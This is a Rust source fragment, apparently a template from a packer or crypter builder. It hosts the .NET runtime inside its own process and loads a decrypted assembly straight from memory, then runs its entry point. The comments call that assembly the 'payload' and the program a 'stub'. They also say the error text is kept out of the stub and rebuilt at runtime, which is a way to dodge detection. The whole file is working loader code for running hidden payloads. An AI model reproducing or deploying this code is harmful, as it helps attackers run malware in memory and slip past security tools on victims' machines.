// --- .NET hosting (technique fragment) ---

use std::ffi::c_void;
use std::ptr;

use windows::core::{GUID, Interface, PCWSTR, VARIANT};
use windows::Win32::System::ClrHosting::{
    CLRCreateInstance, CLSID_CLRMetaHost, ICLRMetaHost, ICLRRuntimeInfo, ICorRuntimeHost,
};
use windows::Win32::System::Com::{CoInitializeEx, COINIT_MULTITHREADED, SAFEARRAY};
use windows::Win32::System::Ole::{
    SafeArrayAccessData, SafeArrayCreateVector, SafeArrayPutElement, SafeArrayUnaccessData,
};
use windows::Win32::System::Variant::{VARENUM, VT_ARRAY, VT_BSTR, VT_I4, VT_NULL, VT_UI1, VT_VARIANT};

/// `CLSID_CorRuntimeHost`: the legacy (v2) hosting interface that can load an
/// assembly from a `byte[]`, which is what an in-memory payload needs.
const CLSID_COR_RUNTIME_HOST: GUID = GUID::from_u128(0xcb2f6723_ab3a_11d2_9c40_00c04fa30a3e);

/// `IID__AppDomain` (`System.AppDomain`). mscorlib is not in the `windows`
/// metadata, so the managed interfaces are called through their vtable slots.
const IID_APPDOMAIN: GUID = GUID::from_u128(0x05f696dc_2b29_3663_ad8b_c4389cf2a713);

/// `_AppDomain.Load_3(byte[])`.
const SLOT_APPDOMAIN_LOAD_3: usize = 45;
/// `Assembly.GetEntryPoint()`.
const SLOT_ASSEMBLY_GET_ENTRY_POINT: usize = 16;
/// `MethodInfo.Invoke_3(object, object[])`.
const SLOT_METHODINFO_INVOKE_3: usize = 37;

/// Formats a failed COM call as `"<label> (0x<hr>)"`.
///
/// `label` is a placeholder that `Params::render_fragment` substitutes with a
/// runtime reconstruction, so no diagnostic text is stored in the stub.
fn nt_error(label: String, hr: i32) -> String {
    format!("{label} (0x{:08x})", hr as u32)
}

/// Calls `IUnknown::QueryInterface` on a raw interface pointer.
unsafe fn com_qi(this: *mut c_void, iid: &GUID) -> Result<*mut c_void, String> {
    if this.is_null() {
        return Err($MSG_NULL_INTERFACE$.to_string());
    }
    let vtbl = *(this as *const *const usize);
    let query_interface: unsafe extern "system" fn(
        *mut c_void,
        *const GUID,
        *mut *mut c_void,
    ) -> i32 = std::mem::transmute(*vtbl);
    let mut out = ptr::null_mut();
    let hr = query_interface(this, iid, &mut out);
    if hr < 0 || out.is_null() {
        return Err(nt_error($MSG_QUERY_INTERFACE_FAILED$, hr));
    }
    Ok(out)
}

/// Reads one function pointer out of an interface's vtable.
unsafe fn vtbl_slot<T: Copy>(this: *mut c_void, index: usize) -> T {
    let vtbl = *(this as *const *const T);
    *vtbl.add(index)
}

/// `VARIANT`: `VARTYPE vt`, three reserved words, then the value union (whose
/// size is driven by `DECIMAL`). The hosting calls need to *build* a `VARIANT`
/// (an array of `BSTR`, and `VT_NULL` for the static entry point) and
/// `windows_core::VARIANT` only hands out shared access, so the two fields are
/// written through this view. The layout is the documented COM ABI, and the
/// assertion below fails the stub build if it ever stops matching.
#[repr(C)]
struct RawVariant {
    vt: u16,
    reserved: [u16; 3],
    value: [u8; VALUE_UNION_BYTES],
}

/// Size of the `VARIANT` value union, measured from the `windows` binding: the
/// union is padded to `DECIMAL`, which is 16 bytes on x64 and 8 on x86, so the
/// whole `VARIANT` is 24 bytes and 16 bytes respectively.
#[cfg(target_arch = "x86_64")]
const VALUE_UNION_BYTES: usize = 16;
#[cfg(target_arch = "x86")]
const VALUE_UNION_BYTES: usize = 8;

/// Offset of the value union inside a `VARIANT` (after `vt` and three words).
const VARIANT_VALUE_OFFSET: usize = 8;

const _: () = assert!(std::mem::size_of::<RawVariant>() == std::mem::size_of::<VARIANT>());

/// Stores `sa` in `value`, tagged as an array of `vt`.
unsafe fn variant_set_array(value: &mut VARIANT, vt: VARENUM, sa: *mut SAFEARRAY) {
    let raw = (value as *mut VARIANT).cast::<RawVariant>();
    (*raw).vt = vt.0;
    std::ptr::write_unaligned(
        (*raw).value.as_mut_ptr() as *mut *mut SAFEARRAY,
        sa,
    );
}

/// The `vt` of a `VARIANT`, read back through the raw layout.
unsafe fn variant_vt(value: &VARIANT) -> u16 {
    let base = value.as_raw() as *const _ as *const u8;
    u16::from_le_bytes([*base, *base.add(1)])
}

/// A `VT_NULL` `VARIANT`: the `this` object `Invoke_3` needs for a static
/// method. Built per call, because a `VARIANT` is not `Copy` on x86, where the
/// hosting call takes it by value.
unsafe fn null_variant() -> VARIANT {
    let mut value = VARIANT::default();
    variant_set_array(&mut value, VT_NULL, ptr::null_mut());
    value
}

/// The `lVal` member of a `VT_I4` `VARIANT`.
unsafe fn variant_lval(value: &VARIANT) -> i32 {
    let base = (value.as_raw() as *const _ as *const u8).add(VARIANT_VALUE_OFFSET);
    *(base as *const i32)
}

/// Copies `bytes` into a `SAFEARRAY` of `VT_UI1`, the `byte[]` `Load_3` wants.
unsafe fn byte_array(bytes: &[u8]) -> Result<*mut SAFEARRAY, String> {
    let array = SafeArrayCreateVector(VT_UI1, 0, bytes.len() as u32);
    if array.is_null() {
        return Err($MSG_ARRAY_FAILED$.to_string());
    }
    let mut data = ptr::null_mut();
    SafeArrayAccessData(array, &mut data).map_err(|e| format!("{}: {e}", $MSG_ARRAY_FAILED$))?;
    ptr::copy_nonoverlapping(bytes.as_ptr(), data as *mut u8, bytes.len());
    SafeArrayUnaccessData(array).ok();
    Ok(array)
}

/// Builds the `string[]` the managed entry point receives.
unsafe fn argument_array(args: &[String]) -> Result<*mut SAFEARRAY, String> {
    let array = SafeArrayCreateVector(VT_BSTR, 0, args.len() as u32);
    if array.is_null() {
        return Err($MSG_ARRAY_FAILED$.to_string());
    }
    if !args.is_empty() {
        let mut raw = ptr::null_mut();
        SafeArrayAccessData(array, &mut raw).map_err(|e| format!("{}: {e}", $MSG_ARRAY_FAILED$))?;
        // The array owns the `BSTR`s, so they are handed over raw: a `BSTR`
        // value that is dropped here would leave the array pointing at freed
        // memory.
        let slots = raw as *mut *const u16;
        for (index, arg) in args.iter().enumerate() {
            let bstr = windows::core::BSTR::from(arg.as_str());
            *slots.add(index) = bstr.into_raw();
        }
        SafeArrayUnaccessData(array).ok();
    }
    Ok(array)
}

/// Hosts the CLR in *this* process and runs the assembly's entry point with
/// `args`, returning the managed exit code (0 when the entry point returns
/// nothing).
///
/// The hosting happens here, in the stub: the payload is never mapped as native
/// code (its entry point would call `mscoree.dll!_CorExeMain`, which starts the
/// CLR for the process's *main* module, i.e. the stub). `_AppDomain.Load_3`
/// takes the assembly's bytes, so the payload stays in memory.
fn run_assembly(image: &[u8], args: &[String]) -> Result<i32, String> {
    let version: String = $CLR_VERSION_DEF$;
    let version_name: String = $CLR_VERSION_NAME_DEF$;
    let version_wide: Vec<u16> = version.encode_utf16().chain(std::iter::once(0)).collect();

    crate::tech_dbg!(
        "dotnet_hosting",
        "starting the CLR ({version}) and loading {} bytes, {} arg(s)",
        image.len(),
        args.len()
    );

    unsafe {
        // COM has to be up before the hosting interfaces can be created; an
        // already-initialized thread is fine (the call then reports a changed
        // mode, which is not fatal here).
        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);

        // The runtime version is also published through the environment, which
        // the loader reads when it picks a runtime for the legacy hosting API.
        std::env::set_var(&version_name, &version);

        let meta: ICLRMetaHost = CLRCreateInstance(&CLSID_CLRMetaHost)
            .map_err(|e| nt_error($MSG_CLR_CREATE_FAILED$, e.code().0))?;
        let runtime: ICLRRuntimeInfo = meta
            .GetRuntime(PCWSTR(version_wide.as_ptr()))
            .map_err(|e| nt_error($MSG_CLR_RUNTIME_FAILED$, e.code().0))?;
        let host: ICorRuntimeHost = runtime
            .GetInterface(&CLSID_COR_RUNTIME_HOST)
            .map_err(|e| nt_error($MSG_CLR_HOST_FAILED$, e.code().0))?;
        host.Start()
            .map_err(|e| nt_error($MSG_CLR_START_FAILED$, e.code().0))?;

        let domain: windows::core::IUnknown = host
            .GetDefaultDomain()
            .map_err(|e| nt_error($MSG_APPDOMAIN_FAILED$, e.code().0))?;
        let appdomain = com_qi(domain.as_raw(), &IID_APPDOMAIN)?;

        // `_AppDomain.Load_3(byte[])` -> `Assembly`.
        let bytes = byte_array(image)?;
        type Load3 = unsafe extern "system" fn(*mut c_void, *mut SAFEARRAY, *mut *mut c_void) -> i32;
        let load_3: Load3 = vtbl_slot(appdomain, SLOT_APPDOMAIN_LOAD_3);
        let mut assembly = ptr::null_mut();
        let hr = load_3(appdomain, bytes, &mut assembly);
        if hr < 0 || assembly.is_null() {
            return Err(nt_error($MSG_ASSEMBLY_LOAD_FAILED$, hr));
        }
        crate::tech_dbg!("dotnet_hosting", "assembly loaded");

        // `Assembly.GetEntryPoint()` -> `MethodInfo`.
        type GetEntryPoint = unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32;
        let get_entry_point: GetEntryPoint = vtbl_slot(assembly, SLOT_ASSEMBLY_GET_ENTRY_POINT);
        let mut method = ptr::null_mut();
        let hr = get_entry_point(assembly, &mut method);
        if hr < 0 || method.is_null() {
            return Err(nt_error($MSG_ENTRY_POINT_FAILED$, hr));
        }

        // `MethodInfo.Invoke_3(null, object[])`: the `object[]` carries the
        // `string[]` argument array.
        let strings = argument_array(args)?;
        let mut argv = VARIANT::default();
        variant_set_array(&mut argv, VARENUM(VT_ARRAY.0 | VT_BSTR.0), strings);
        let parameters = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        if parameters.is_null() {
            return Err($MSG_ARRAY_FAILED$.to_string());
        }
        let index = 0i32;
        SafeArrayPutElement(parameters, &index, &argv as *const VARIANT as *const c_void)
            .map_err(|e| format!("{}: {e}", $MSG_ARRAY_FAILED$))?;

        let mut result = VARIANT::default();

        // `Invoke_3`'s `VARIANT` argument is passed by value in the 32-bit
        // `stdcall` ABI and by reference on x64, where the 16-byte struct is
        // larger than what fits in the argument registers.
        #[cfg(target_arch = "x86")]
        type Invoke3 =
            unsafe extern "system" fn(*mut c_void, VARIANT, *mut SAFEARRAY, *mut VARIANT) -> i32;
        #[cfg(target_arch = "x86_64")]
        type Invoke3 = unsafe extern "system" fn(
            *mut c_void,
            *mut VARIANT,
            *mut SAFEARRAY,
            *mut VARIANT,
        ) -> i32;
        let invoke_3: Invoke3 = vtbl_slot(method, SLOT_METHODINFO_INVOKE_3);

        #[cfg(target_arch = "x86")]
        let hr = invoke_3(method, null_variant(), parameters, &mut result);
        #[cfg(target_arch = "x86_64")]
        let hr = invoke_3(method, &mut null_variant(), parameters, &mut result);

        if hr < 0 {
            // A managed `Main()` without parameters rejects the array; retry
            // with an empty one before giving up.
            crate::tech_dbg!("dotnet_hosting", "the entry point rejected its arguments");
            let empty = SafeArrayCreateVector(VT_VARIANT, 0, 0);
            #[cfg(target_arch = "x86")]
            let retry = invoke_3(method, null_variant(), empty, &mut result);
            #[cfg(target_arch = "x86_64")]
            let retry = invoke_3(method, &mut null_variant(), empty, &mut result);
            if retry < 0 {
                return Err(nt_error($MSG_ENTRY_POINT_FAILED$, retry));
            }
        }

        // `static int Main()` comes back as `VT_I4`; `static void Main()` as an
        // empty variant.
        let code = if variant_vt(&result) == VT_I4.0 {
            variant_lval(&result)
        } else {
            0
        };
        crate::tech_dbg!("dotnet_hosting", "the entry point returned {code}");
        Ok(code)
    }
}

/// Adapter expected by the stub skeleton (`run()` calls this with the
/// decrypted payload).
fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    let args: Vec<String> = crate::payload_arguments();
    run_assembly(image, &args)
}
